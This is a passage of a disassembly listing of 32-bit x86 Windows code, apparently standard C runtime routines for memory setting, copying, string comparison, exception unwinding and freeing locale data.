  42612f:	jmp    0x426146
  426131:	xor    eax,eax
  426133:	inc    eax
  426134:	ret    
  426135:	mov    esp,DWORD PTR [ebp-0x18]
  426138:	call   0x426dc5
  42613d:	xor    esi,esi
  42613f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426143:	mov    edi,DWORD PTR [ebp-0x28]
  426146:	test   esi,esi
  426148:	jne    0x426161
  42614a:	push   edi
  42614b:	push   0x2
  42614d:	call   0x424a48
  426152:	pop    ecx
  426153:	pop    ecx
  426154:	mov    esi,eax
  426156:	test   esi,esi
  426158:	je     0x4261c1
  42615a:	mov    DWORD PTR [ebp-0x24],0x1
  426161:	push   edi
  426162:	push   esi
  426163:	push   DWORD PTR [ebp+0x10]
  426166:	push   DWORD PTR [ebp+0xc]
  426169:	push   0x1
  42616b:	push   DWORD PTR [ebp+0x18]
  42616e:	call   DWORD PTR ds:0x428108
  426174:	test   eax,eax
  426176:	je     0x426189
  426178:	push   DWORD PTR [ebp+0x14]
  42617b:	push   eax
  42617c:	push   esi
  42617d:	push   DWORD PTR [ebp+0x8]
  426180:	call   DWORD PTR ds:0x428114
  426186:	mov    DWORD PTR [ebp-0x20],eax
  426189:	cmp    DWORD PTR [ebp-0x24],0x0
  42618d:	je     0x426196
  42618f:	push   esi
  426190:	call   0x42453a
  426195:	pop    ecx
  426196:	mov    eax,DWORD PTR [ebp-0x20]
  426199:	jmp    0x426209
  42619b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42619e:	cmp    ebx,esi
  4261a0:	jne    0x4261a8
  4261a2:	mov    ebx,DWORD PTR ds:0x462f84
  4261a8:	mov    edi,DWORD PTR [ebp+0x18]
  4261ab:	test   edi,edi
  4261ad:	jne    0x4261b5
  4261af:	mov    edi,DWORD PTR ds:0x462f94
  4261b5:	push   ebx
  4261b6:	call   0x426bad
  4261bb:	pop    ecx
  4261bc:	cmp    eax,0xffffffff
  4261bf:	jne    0x4261c5
  4261c1:	xor    eax,eax
  4261c3:	jmp    0x426209
  4261c5:	cmp    eax,edi
  4261c7:	je     0x4261e7
  4261c9:	push   0x0
  4261cb:	push   0x0
  4261cd:	lea    ecx,[ebp+0x10]
  4261d0:	push   ecx
  4261d1:	push   DWORD PTR [ebp+0xc]
  4261d4:	push   eax
  4261d5:	push   edi
  4261d6:	call   0x426bf6
  4261db:	add    esp,0x18
  4261de:	mov    esi,eax
  4261e0:	test   esi,esi
  4261e2:	je     0x4261c1
  4261e4:	mov    DWORD PTR [ebp+0xc],esi
  4261e7:	push   DWORD PTR [ebp+0x14]
  4261ea:	push   DWORD PTR [ebp+0x10]
  4261ed:	push   DWORD PTR [ebp+0xc]
  4261f0:	push   DWORD PTR [ebp+0x8]
  4261f3:	push   ebx
  4261f4:	call   DWORD PTR ds:0x428110
  4261fa:	mov    edi,eax
  4261fc:	test   esi,esi
  4261fe:	je     0x426207
  426200:	push   esi
  426201:	call   0x42453a
  426206:	pop    ecx
  426207:	mov    eax,edi
  426209:	lea    esp,[ebp-0x38]
  42620c:	call   0x42396f
  426211:	ret    
  426212:	mov    eax,ds:0x462fa4
  426217:	test   eax,eax
  426219:	je     0x42622a
  42621b:	push   DWORD PTR [esp+0x4]
  42621f:	call   eax
  426221:	test   eax,eax
  426223:	pop    ecx
  426224:	je     0x42622a
  426226:	xor    eax,eax
  426228:	inc    eax
  426229:	ret    
  42622a:	xor    eax,eax
  42622c:	ret    
  42622d:	int3   
  42622e:	int3   
  42622f:	int3   
  426230:	mov    edx,DWORD PTR [esp+0xc]
  426234:	mov    ecx,DWORD PTR [esp+0x4]
  426238:	test   edx,edx
  42623a:	je     0x42628b
  42623c:	xor    eax,eax
  42623e:	mov    al,BYTE PTR [esp+0x8]
  426242:	push   edi
  426243:	mov    edi,ecx
  426245:	cmp    edx,0x4
  426248:	jb     0x42627b
  42624a:	neg    ecx
  42624c:	and    ecx,0x3
  42624f:	je     0x42625d
  426251:	sub    edx,ecx
  426253:	mov    BYTE PTR [edi],al
  426255:	add    edi,0x1
  426258:	sub    ecx,0x1
  42625b:	jne    0x426253
  42625d:	mov    ecx,eax
  42625f:	shl    eax,0x8
  426262:	add    eax,ecx
  426264:	mov    ecx,eax
  426266:	shl    eax,0x10
  426269:	add    eax,ecx
  42626b:	mov    ecx,edx
  42626d:	and    edx,0x3
  426270:	shr    ecx,0x2
  426273:	je     0x42627b
  426275:	rep stos DWORD PTR es:[edi],eax
  426277:	test   edx,edx
  426279:	je     0x426285
  42627b:	mov    BYTE PTR [edi],al
  42627d:	add    edi,0x1
  426280:	sub    edx,0x1
  426283:	jne    0x42627b
  426285:	mov    eax,DWORD PTR [esp+0x8]
  426289:	pop    edi
  42628a:	ret    
  42628b:	mov    eax,DWORD PTR [esp+0x4]
  42628f:	ret    
  426290:	push   esi
  426291:	mov    esi,DWORD PTR [esp+0x8]
  426295:	test   esi,esi
  426297:	je     0x42641e
  42629d:	push   DWORD PTR [esi+0x4]
  4262a0:	call   0x42453a
  4262a5:	push   DWORD PTR [esi+0x8]
  4262a8:	call   0x42453a
  4262ad:	push   DWORD PTR [esi+0xc]
  4262b0:	call   0x42453a
  4262b5:	push   DWORD PTR [esi+0x10]
  4262b8:	call   0x42453a
  4262bd:	push   DWORD PTR [esi+0x14]
  4262c0:	call   0x42453a
  4262c5:	push   DWORD PTR [esi+0x18]
  4262c8:	call   0x42453a
  4262cd:	push   DWORD PTR [esi]
  4262cf:	call   0x42453a
  4262d4:	push   DWORD PTR [esi+0x20]
  4262d7:	call   0x42453a
  4262dc:	push   DWORD PTR [esi+0x24]
  4262df:	call   0x42453a
  4262e4:	push   DWORD PTR [esi+0x28]
  4262e7:	call   0x42453a
  4262ec:	push   DWORD PTR [esi+0x2c]
  4262ef:	call   0x42453a
  4262f4:	push   DWORD PTR [esi+0x30]
  4262f7:	call   0x42453a
  4262fc:	push   DWORD PTR [esi+0x34]
  4262ff:	call   0x42453a
  426304:	push   DWORD PTR [esi+0x1c]
  426307:	call   0x42453a
  42630c:	push   DWORD PTR [esi+0x38]
  42630f:	call   0x42453a
  426314:	push   DWORD PTR [esi+0x3c]
  426317:	call   0x42453a
  42631c:	add    esp,0x40
  42631f:	push   DWORD PTR [esi+0x40]
  426322:	call   0x42453a
  426327:	push   DWORD PTR [esi+0x44]
  42632a:	call   0x42453a
  42632f:	push   DWORD PTR [esi+0x48]
  426332:	call   0x42453a
  426337:	push   DWORD PTR [esi+0x4c]
  42633a:	call   0x42453a
  42633f:	push   DWORD PTR [esi+0x50]
  426342:	call   0x42453a
  426347:	push   DWORD PTR [esi+0x54]
  42634a:	call   0x42453a
  42634f:	push   DWORD PTR [esi+0x58]
  426352:	call   0x42453a
  426357:	push   DWORD PTR [esi+0x5c]
  42635a:	call   0x42453a
  42635f:	push   DWORD PTR [esi+0x60]
  426362:	call   0x42453a
  426367:	push   DWORD PTR [esi+0x64]
  42636a:	call   0x42453a
  42636f:	push   DWORD PTR [esi+0x68]
  426372:	call   0x42453a
  426377:	push   DWORD PTR [esi+0x6c]
  42637a:	call   0x42453a
  42637f:	push   DWORD PTR [esi+0x70]
  426382:	call   0x42453a
  426387:	push   DWORD PTR [esi+0x74]
  42638a:	call   0x42453a
  42638f:	push   DWORD PTR [esi+0x78]
  426392:	call   0x42453a
  426397:	push   DWORD PTR [esi+0x7c]
  42639a:	call   0x42453a
  42639f:	add    esp,0x40
  4263a2:	push   DWORD PTR [esi+0x80]
  4263a8:	call   0x42453a
  4263ad:	push   DWORD PTR [esi+0x84]
  4263b3:	call   0x42453a
  4263b8:	push   DWORD PTR [esi+0x88]
  4263be:	call   0x42453a
  4263c3:	push   DWORD PTR [esi+0x8c]
  4263c9:	call   0x42453a
  4263ce:	push   DWORD PTR [esi+0x90]
  4263d4:	call   0x42453a
  4263d9:	push   DWORD PTR [esi+0x94]
  4263df:	call   0x42453a
  4263e4:	push   DWORD PTR [esi+0x98]
  4263ea:	call   0x42453a
  4263ef:	push   DWORD PTR [esi+0x9c]
  4263f5:	call   0x42453a
  4263fa:	push   DWORD PTR [esi+0xa0]
  426400:	call   0x42453a
  426405:	push   DWORD PTR [esi+0xa4]
  42640b:	call   0x42453a
  426410:	push   DWORD PTR [esi+0xa8]
  426416:	call   0x42453a
  42641b:	add    esp,0x2c
  42641e:	pop    esi
  42641f:	ret    
  426420:	push   esi
  426421:	mov    esi,DWORD PTR [esp+0x8]
  426425:	test   esi,esi
  426427:	je     0x42647d
  426429:	mov    eax,DWORD PTR [esi]
  42642b:	mov    ecx,DWORD PTR ds:0x462b04
  426431:	cmp    eax,DWORD PTR [ecx]
  426433:	je     0x426444
  426435:	cmp    eax,DWORD PTR ds:0x462ad4
  42643b:	je     0x426444
  42643d:	push   eax
  42643e:	call   0x42453a
  426443:	pop    ecx
  426444:	mov    eax,DWORD PTR [esi+0x4]
  426447:	mov    ecx,DWORD PTR ds:0x462b04
  42644d:	cmp    eax,DWORD PTR [ecx+0x4]
  426450:	je     0x426461
  426452:	cmp    eax,DWORD PTR ds:0x462ad8
  426458:	je     0x426461
  42645a:	push   eax
  42645b:	call   0x42453a
  426460:	pop    ecx
  426461:	mov    esi,DWORD PTR [esi+0x8]
  426464:	mov    eax,ds:0x462b04
  426469:	cmp    esi,DWORD PTR [eax+0x8]
  42646c:	je     0x42647d
  42646e:	cmp    esi,DWORD PTR ds:0x462adc
  426474:	je     0x42647d
  426476:	push   esi
  426477:	call   0x42453a
  42647c:	pop    ecx
  42647d:	pop    esi
  42647e:	ret    
  42647f:	push   esi
  426480:	mov    esi,DWORD PTR [esp+0x8]
  426484:	test   esi,esi
  426486:	je     0x426556
  42648c:	mov    eax,DWORD PTR [esi+0xc]
  42648f:	mov    ecx,DWORD PTR ds:0x462b04
  426495:	cmp    eax,DWORD PTR [ecx+0xc]
  426498:	je     0x4264a9
  42649a:	cmp    eax,DWORD PTR ds:0x462ae0
  4264a0:	je     0x4264a9
  4264a2:	push   eax
  4264a3:	call   0x42453a
  4264a8:	pop    ecx
  4264a9:	mov    eax,DWORD PTR [esi+0x10]
  4264ac:	mov    ecx,DWORD PTR ds:0x462b04
  4264b2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264b5:	je     0x4264c6
  4264b7:	cmp    eax,DWORD PTR ds:0x462ae4
  4264bd:	je     0x4264c6
  4264bf:	push   eax
  4264c0:	call   0x42453a
  4264c5:	pop    ecx
  4264c6:	mov    eax,DWORD PTR [esi+0x14]
  4264c9:	mov    ecx,DWORD PTR ds:0x462b04
  4264cf:	cmp    eax,DWORD PTR [ecx+0x14]
  4264d2:	je     0x4264e3
  4264d4:	cmp    eax,DWORD PTR ds:0x462ae8
  4264da:	je     0x4264e3
  4264dc:	push   eax
  4264dd:	call   0x42453a
  4264e2:	pop    ecx
  4264e3:	mov    eax,DWORD PTR [esi+0x18]
  4264e6:	mov    ecx,DWORD PTR ds:0x462b04
  4264ec:	cmp    eax,DWORD PTR [ecx+0x18]
  4264ef:	je     0x426500
  4264f1:	cmp    eax,DWORD PTR ds:0x462aec
  4264f7:	je     0x426500
  4264f9:	push   eax
  4264fa:	call   0x42453a
  4264ff:	pop    ecx
  426500:	mov    eax,DWORD PTR [esi+0x1c]
  426503:	mov    ecx,DWORD PTR ds:0x462b04
  426509:	cmp    eax,DWORD PTR [ecx+0x1c]
  42650c:	je     0x42651d
  42650e:	cmp    eax,DWORD PTR ds:0x462af0
  426514:	je     0x42651d
  426516:	push   eax
  426517:	call   0x42453a
  42651c:	pop    ecx
  42651d:	mov    eax,DWORD PTR [esi+0x20]
  426520:	mov    ecx,DWORD PTR ds:0x462b04
  426526:	cmp    eax,DWORD PTR [ecx+0x20]
  426529:	je     0x42653a
  42652b:	cmp    eax,DWORD PTR ds:0x462af4
  426531:	je     0x42653a
  426533:	push   eax
  426534:	call   0x42453a
  426539:	pop    ecx
  42653a:	mov    esi,DWORD PTR [esi+0x24]
  42653d:	mov    eax,ds:0x462b04
  426542:	cmp    esi,DWORD PTR [eax+0x24]
  426545:	je     0x426556
  426547:	cmp    esi,DWORD PTR ds:0x462af8
  42654d:	je     0x426556
  42654f:	push   esi
  426550:	call   0x42453a
  426555:	pop    ecx
  426556:	pop    esi
  426557:	ret    
  426558:	int3   
  426559:	int3   
  42655a:	int3   
  42655b:	int3   
  42655c:	int3   
  42655d:	int3   
  42655e:	int3   
  42655f:	int3   
  426560:	push   ebp
  426561:	mov    ebp,esp
  426563:	push   esi
  426564:	xor    eax,eax
  426566:	push   eax
  426567:	push   eax
  426568:	push   eax
  426569:	push   eax
  42656a:	push   eax
  42656b:	push   eax
  42656c:	push   eax
  42656d:	push   eax
  42656e:	mov    edx,DWORD PTR [ebp+0xc]
  426571:	lea    ecx,[ecx+0x0]
  426574:	mov    al,BYTE PTR [edx]
  426576:	or     al,al
  426578:	je     0x426583
  42657a:	add    edx,0x1
  42657d:	bts    DWORD PTR [esp],eax
  426581:	jmp    0x426574
  426583:	mov    esi,DWORD PTR [ebp+0x8]
  426586:	or     ecx,0xffffffff
  426589:	lea    ecx,[ecx+0x0]
  42658c:	add    ecx,0x1
  42658f:	mov    al,BYTE PTR [esi]
  426591:	or     al,al
  426593:	je     0x42659e
  426595:	add    esi,0x1
  426598:	bt     DWORD PTR [esp],eax
  42659c:	jae    0x42658c
  42659e:	mov    eax,ecx
  4265a0:	add    esp,0x20
  4265a3:	pop    esi
  4265a4:	leave  
  4265a5:	ret    
  4265a6:	int3   
  4265a7:	int3   
  4265a8:	int3   
  4265a9:	int3   
  4265aa:	int3   
  4265ab:	int3   
  4265ac:	int3   
  4265ad:	int3   
  4265ae:	int3   
  4265af:	int3   
  4265b0:	mov    edx,DWORD PTR [esp+0x4]
  4265b4:	mov    ecx,DWORD PTR [esp+0x8]
  4265b8:	test   edx,0x3
  4265be:	jne    0x4265fc
  4265c0:	mov    eax,DWORD PTR [edx]
  4265c2:	cmp    al,BYTE PTR [ecx]
  4265c4:	jne    0x4265f4
  4265c6:	or     al,al
  4265c8:	je     0x4265f0
  4265ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4265cd:	jne    0x4265f4
  4265cf:	or     ah,ah
  4265d1:	je     0x4265f0
  4265d3:	shr    eax,0x10
  4265d6:	cmp    al,BYTE PTR [ecx+0x2]
  4265d9:	jne    0x4265f4
  4265db:	or     al,al
  4265dd:	je     0x4265f0
  4265df:	cmp    ah,BYTE PTR [ecx+0x3]
  4265e2:	jne    0x4265f4
  4265e4:	add    ecx,0x4
  4265e7:	add    edx,0x4
  4265ea:	or     ah,ah
  4265ec:	jne    0x4265c0
  4265ee:	mov    edi,edi
  4265f0:	xor    eax,eax
  4265f2:	ret    
  4265f3:	nop
  4265f4:	sbb    eax,eax
  4265f6:	shl    eax,1
  4265f8:	add    eax,0x1
  4265fb:	ret    
  4265fc:	test   edx,0x1
  426602:	je     0x42661c
  426604:	mov    al,BYTE PTR [edx]
  426606:	add    edx,0x1
  426609:	cmp    al,BYTE PTR [ecx]
  42660b:	jne    0x4265f4
  42660d:	add    ecx,0x1
  426610:	or     al,al
  426612:	je     0x4265f0
  426614:	test   edx,0x2
  42661a:	je     0x4265c0
  42661c:	mov    ax,WORD PTR [edx]
  42661f:	add    edx,0x2
  426622:	cmp    al,BYTE PTR [ecx]
  426624:	jne    0x4265f4
  426626:	or     al,al
  426628:	je     0x4265f0
  42662a:	cmp    ah,BYTE PTR [ecx+0x1]
  42662d:	jne    0x4265f4
  42662f:	or     ah,ah
  426631:	je     0x4265f0
  426633:	add    ecx,0x2
  426636:	jmp    0x4265c0
  426638:	int3   
  426639:	int3   
  42663a:	int3   
  42663b:	int3   
  42663c:	int3   
  42663d:	int3   
  42663e:	int3   
  42663f:	int3   
  426640:	mov    eax,DWORD PTR [esp+0xc]
  426644:	test   eax,eax
  426646:	je     0x426692
  426648:	mov    edx,DWORD PTR [esp+0x4]
  42664c:	push   esi
  42664d:	push   edi
  42664e:	mov    esi,edx
  426650:	mov    edi,DWORD PTR [esp+0x10]
  426654:	or     edx,edi
  426656:	and    edx,0x3
  426659:	je     0x426693
  42665b:	test   eax,0x1
  426660:	je     0x426673
  426662:	mov    cl,BYTE PTR [esi]
  426664:	cmp    cl,BYTE PTR [edi]
  426666:	jne    0x4266c0
  426668:	add    esi,0x1
  42666b:	add    edi,0x1
  42666e:	sub    eax,0x1
  426671:	je     0x426690
  426673:	mov    cl,BYTE PTR [esi]
  426675:	mov    dl,BYTE PTR [edi]
  426677:	cmp    cl,dl
  426679:	jne    0x4266c0
  42667b:	mov    cl,BYTE PTR [esi+0x1]
  42667e:	mov    dl,BYTE PTR [edi+0x1]
  426681:	cmp    cl,dl
  426683:	jne    0x4266c0
  426685:	add    edi,0x2
  426688:	add    esi,0x2
  42668b:	sub    eax,0x2
  42668e:	jne    0x426673
  426690:	pop    edi
  426691:	pop    esi
  426692:	ret    
  426693:	mov    ecx,eax
  426695:	and    eax,0x3
  426698:	shr    ecx,0x2
  42669b:	je     0x4266c8
  42669d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42669f:	je     0x4266c8
  4266a1:	mov    ecx,DWORD PTR [esi-0x4]
  4266a4:	mov    edx,DWORD PTR [edi-0x4]
  4266a7:	cmp    cl,dl
  4266a9:	jne    0x4266bb
  4266ab:	cmp    ch,dh
  4266ad:	jne    0x4266bb
  4266af:	shr    ecx,0x10
  4266b2:	shr    edx,0x10
  4266b5:	cmp    cl,dl
  4266b7:	jne    0x4266bb
  4266b9:	cmp    ch,dh
  4266bb:	mov    eax,0x0
  4266c0:	sbb    eax,eax
  4266c2:	pop    edi
  4266c3:	sbb    eax,0xffffffff
  4266c6:	pop    esi
  4266c7:	ret    
  4266c8:	test   eax,eax
  4266ca:	je     0x426690
  4266cc:	mov    edx,DWORD PTR [esi]
  4266ce:	mov    ecx,DWORD PTR [edi]
  4266d0:	cmp    dl,cl
  4266d2:	jne    0x4266bb
  4266d4:	sub    eax,0x1
  4266d7:	je     0x4266f5
  4266d9:	cmp    dh,ch
  4266db:	jne    0x4266bb
  4266dd:	sub    eax,0x1
  4266e0:	je     0x4266f5
  4266e2:	and    ecx,0xff0000
  4266e8:	and    edx,0xff0000
  4266ee:	cmp    edx,ecx
  4266f0:	jne    0x4266bb
  4266f2:	sub    eax,0x1
  4266f5:	pop    edi
  4266f6:	pop    esi
  4266f7:	ret    
  4266f8:	int3   
  4266f9:	int3   
  4266fa:	int3   
  4266fb:	int3   
  4266fc:	int3   
  4266fd:	int3   
  4266fe:	int3   
  4266ff:	int3   
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   edi
  426704:	push   esi
  426705:	push   ebx
  426706:	mov    ecx,DWORD PTR [ebp+0x10]
  426709:	jecxz  0x426732
  42670b:	mov    ebx,ecx
  42670d:	mov    edi,DWORD PTR [ebp+0x8]
  426710:	mov    esi,edi
  426712:	xor    eax,eax
  426714:	repnz scas al,BYTE PTR es:[edi]
  426716:	neg    ecx
  426718:	add    ecx,ebx
  42671a:	mov    edi,esi
  42671c:	mov    esi,DWORD PTR [ebp+0xc]
  42671f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426721:	mov    al,BYTE PTR [esi-0x1]
  426724:	xor    ecx,ecx
  426726:	cmp    al,BYTE PTR [edi-0x1]
  426729:	ja     0x426730
  42672b:	je     0x426732
  42672d:	sub    ecx,0x2
  426730:	not    ecx
  426732:	mov    eax,ecx
  426734:	pop    ebx
  426735:	pop    esi
  426736:	pop    edi
  426737:	leave  
  426738:	ret    
  426739:	int3   
  42673a:	int3   
  42673b:	int3   
  42673c:	int3   
  42673d:	int3   
  42673e:	int3   
  42673f:	int3   
  426740:	push   ebp
  426741:	mov    ebp,esp
  426743:	push   esi
  426744:	xor    eax,eax
  426746:	push   eax
  426747:	push   eax
  426748:	push   eax
  426749:	push   eax
  42674a:	push   eax
  42674b:	push   eax
  42674c:	push   eax
  42674d:	push   eax
  42674e:	mov    edx,DWORD PTR [ebp+0xc]
  426751:	lea    ecx,[ecx+0x0]
  426754:	mov    al,BYTE PTR [edx]
  426756:	or     al,al
  426758:	je     0x426763
  42675a:	add    edx,0x1
  42675d:	bts    DWORD PTR [esp],eax
  426761:	jmp    0x426754
  426763:	mov    esi,DWORD PTR [ebp+0x8]
  426766:	mov    edi,edi
  426768:	mov    al,BYTE PTR [esi]
  42676a:	or     al,al
  42676c:	je     0x42677a
  42676e:	add    esi,0x1
  426771:	bt     DWORD PTR [esp],eax
  426775:	jae    0x426768
  426777:	lea    eax,[esi-0x1]
  42677a:	add    esp,0x20
  42677d:	pop    esi
  42677e:	leave  
  42677f:	ret    
  426780:	push   ebp
  426781:	mov    ebp,esp
  426783:	push   ebx
  426784:	push   esi
  426785:	push   edi
  426786:	push   ebp
  426787:	push   0x0
  426789:	push   0x0
  42678b:	push   0x426798
  426790:	push   DWORD PTR [ebp+0x8]
  426793:	call   0x42720e
  426798:	pop    ebp
  426799:	pop    edi
  42679a:	pop    esi
  42679b:	pop    ebx
  42679c:	mov    esp,ebp
  42679e:	pop    ebp
  42679f:	ret    
  4267a0:	mov    ecx,DWORD PTR [esp+0x4]
  4267a4:	test   DWORD PTR [ecx+0x4],0x6
  4267ab:	mov    eax,0x1
  4267b0:	je     0x4267c1
  4267b2:	mov    eax,DWORD PTR [esp+0x8]
  4267b6:	mov    edx,DWORD PTR [esp+0x10]
  4267ba:	mov    DWORD PTR [edx],eax
  4267bc:	mov    eax,0x3
  4267c1:	ret    
  4267c2:	push   ebx
  4267c3:	push   esi
  4267c4:	push   edi
  4267c5:	mov    eax,DWORD PTR [esp+0x10]
  4267c9:	push   eax
  4267ca:	push   0xfffffffe
  4267cc:	push   0x4267a0
  4267d1:	push   DWORD PTR fs:0x0
  4267d8:	mov    DWORD PTR fs:0x0,esp
  4267df:	mov    eax,DWORD PTR [esp+0x20]
  4267e3:	mov    ebx,DWORD PTR [eax+0x8]
  4267e6:	mov    esi,DWORD PTR [eax+0xc]
  4267e9:	cmp    esi,0xffffffff
  4267ec:	je     0x42681c
  4267ee:	cmp    esi,DWORD PTR [esp+0x24]
  4267f2:	je     0x42681c
  4267f4:	lea    esi,[esi+esi*2]
  4267f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4267fa:	mov    DWORD PTR [esp+0x8],ecx
  4267fe:	mov    DWORD PTR [eax+0xc],ecx
  426801:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426806:	jne    0x42681a
  426808:	push   0x101
  42680d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426811:	call   0x426856
  426816:	call   DWORD PTR [ebx+esi*4+0x8]
  42681a:	jmp    0x4267df
  42681c:	pop    DWORD PTR fs:0x0
  426823:	add    esp,0xc
  426826:	pop    edi
  426827:	pop    esi
  426828:	pop    ebx
  426829:	ret    
  42682a:	xor    eax,eax
  42682c:	mov    ecx,DWORD PTR fs:0x0
  426833:	cmp    DWORD PTR [ecx+0x4],0x4267a0
  42683a:	jne    0x42684c
  42683c:	mov    edx,DWORD PTR [ecx+0xc]
  42683f:	mov    edx,DWORD PTR [edx+0xc]
  426842:	cmp    DWORD PTR [ecx+0x8],edx
  426845:	jne    0x42684c
  426847:	mov    eax,0x1
  42684c:	ret    
  42684d:	push   ebx
  42684e:	push   ecx
  42684f:	mov    ebx,0x462b1c
  426854:	jmp    0x426860
  426856:	push   ebx
  426857:	push   ecx
  426858:	mov    ebx,0x462b1c
  42685d:	mov    ecx,DWORD PTR [ebp+0x8]
  426860:	mov    DWORD PTR [ebx+0x8],ecx
  426863:	mov    DWORD PTR [ebx+0x4],eax
  426866:	mov    DWORD PTR [ebx+0xc],ebp
  426869:	pop    ecx
  42686a:	pop    ebx
  42686b:	ret    0x4
  42686e:	int3   
  42686f:	int3   
  426870:	push   ebp
  426871:	mov    ebp,esp
  426873:	push   edi
  426874:	push   esi
  426875:	mov    esi,DWORD PTR [ebp+0xc]
  426878:	mov    ecx,DWORD PTR [ebp+0x10]
  42687b:	mov    edi,DWORD PTR [ebp+0x8]
  42687e:	mov    eax,ecx
  426880:	mov    edx,ecx
  426882:	add    eax,esi
  426884:	cmp    edi,esi
  426886:	jbe    0x426890
  426888:	cmp    edi,eax
  42688a:	jb     0x426a0c
  426890:	test   edi,0x3
  426896:	jne    0x4268ac
  426898:	shr    ecx,0x2
  42689b:	and    edx,0x3
  42689e:	cmp    ecx,0x8
  4268a1:	jb     0x4268cc
  4268a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a5:	jmp    DWORD PTR [edx*4+0x4269bc]
  4268ac:	mov    eax,edi
  4268ae:	mov    edx,0x3
  4268b3:	sub    ecx,0x4
  4268b6:	jb     0x4268c4
  4268b8:	and    eax,0x3
  4268bb:	add    ecx,eax
  4268bd:	jmp    DWORD PTR [eax*4+0x4268d0]
  4268c4:	jmp    DWORD PTR [ecx*4+0x4269cc]
  4268cb:	nop
  4268cc:	jmp    DWORD PTR [ecx*4+0x426950]
  4268d3:	nop
  4268d4:	loopne 0x42693e
  4268d6:	inc    edx
  4268d7:	add    BYTE PTR [ecx+ebp*2],cl
  4268da:	inc    edx
  4268db:	add    BYTE PTR [eax],dh
  4268dd:	imul   eax,DWORD PTR [edx+0x0],0x68ad123
  4268e4:	mov    BYTE PTR [edi],al
  4268e6:	mov    al,BYTE PTR [esi+0x1]
  4268e9:	mov    BYTE PTR [edi+0x1],al
  4268ec:	mov    al,BYTE PTR [esi+0x2]
  4268ef:	shr    ecx,0x2
  4268f2:	mov    BYTE PTR [edi+0x2],al
  4268f5:	add    esi,0x3
  4268f8:	add    edi,0x3
  4268fb:	cmp    ecx,0x8
  4268fe:	jb     0x4268cc
  426900:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426902:	jmp    DWORD PTR [edx*4+0x4269bc]
  426909:	lea    ecx,[ecx+0x0]
  42690c:	and    edx,ecx
  42690e:	mov    al,BYTE PTR [esi]
  426910:	mov    BYTE PTR [edi],al
  426912:	mov    al,BYTE PTR [esi+0x1]
  426915:	shr    ecx,0x2
  426918:	mov    BYTE PTR [edi+0x1],al
  42691b:	add    esi,0x2
  42691e:	add    edi,0x2
  426921:	cmp    ecx,0x8
  426924:	jb     0x4268cc
  426926:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426928:	jmp    DWORD PTR [edx*4+0x4269bc]
  42692f:	nop
  426930:	and    edx,ecx
  426932:	mov    al,BYTE PTR [esi]
  426934:	mov    BYTE PTR [edi],al
  426936:	add    esi,0x1
  426939:	shr    ecx,0x2
  42693c:	add    edi,0x1
  42693f:	cmp    ecx,0x8
  426942:	jb     0x4268cc
  426944:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426946:	jmp    DWORD PTR [edx*4+0x4269bc]
  42694d:	lea    ecx,[ecx+0x0]
  426950:	mov    bl,0x69
  426952:	inc    edx
  426953:	add    BYTE PTR [eax-0x67ffbd97],ah
  426959:	imul   eax,DWORD PTR [edx+0x0],0x426990
  426960:	mov    BYTE PTR [ecx+0x42],ch
  426963:	add    BYTE PTR [eax+0x78004269],al
  426969:	imul   eax,DWORD PTR [edx+0x0],0x426970
  426970:	mov    eax,DWORD PTR [esi+ecx*4-0x1c]
  426974:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426978:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42697c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426980:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426984:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426988:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42698c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426990:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426994:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269a8:	lea    eax,[ecx*4+0x0]
  4269af:	add    esi,eax
  4269b1:	add    edi,eax
  4269b3:	jmp    DWORD PTR [edx*4+0x4269bc]
  4269ba:	mov    edi,edi
  4269bc:	int3   
  4269bd:	imul   eax,DWORD PTR [edx+0x0],0x4269d4
  4269c4:	loopne 0x426a2f
  4269c6:	inc    edx
  4269c7:	add    ah,dh
  4269c9:	imul   eax,DWORD PTR [edx+0x0],0x5e08458b
  4269d0:	pop    edi
  4269d1:	leave  
  4269d2:	ret    
  4269d3:	nop
  4269d4:	mov    al,BYTE PTR [esi]
  4269d6:	mov    BYTE PTR [edi],al
  4269d8:	mov    eax,DWORD PTR [ebp+0x8]
  4269db:	pop    esi
  4269dc:	pop    edi
  4269dd:	leave  
  4269de:	ret    
  4269df:	nop
  4269e0:	mov    al,BYTE PTR [esi]
  4269e2:	mov    BYTE PTR [edi],al
  4269e4:	mov    al,BYTE PTR [esi+0x1]
  4269e7:	mov    BYTE PTR [edi+0x1],al
  4269ea:	mov    eax,DWORD PTR [ebp+0x8]
  4269ed:	pop    esi
  4269ee:	pop    edi
  4269ef:	leave  
  4269f0:	ret    
  4269f1:	lea    ecx,[ecx+0x0]
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    al,BYTE PTR [esi+0x1]
  4269fb:	mov    BYTE PTR [edi+0x1],al
  4269fe:	mov    al,BYTE PTR [esi+0x2]
  426a01:	mov    BYTE PTR [edi+0x2],al
  426a04:	mov    eax,DWORD PTR [ebp+0x8]
  426a07:	pop    esi
  426a08:	pop    edi
  426a09:	leave  
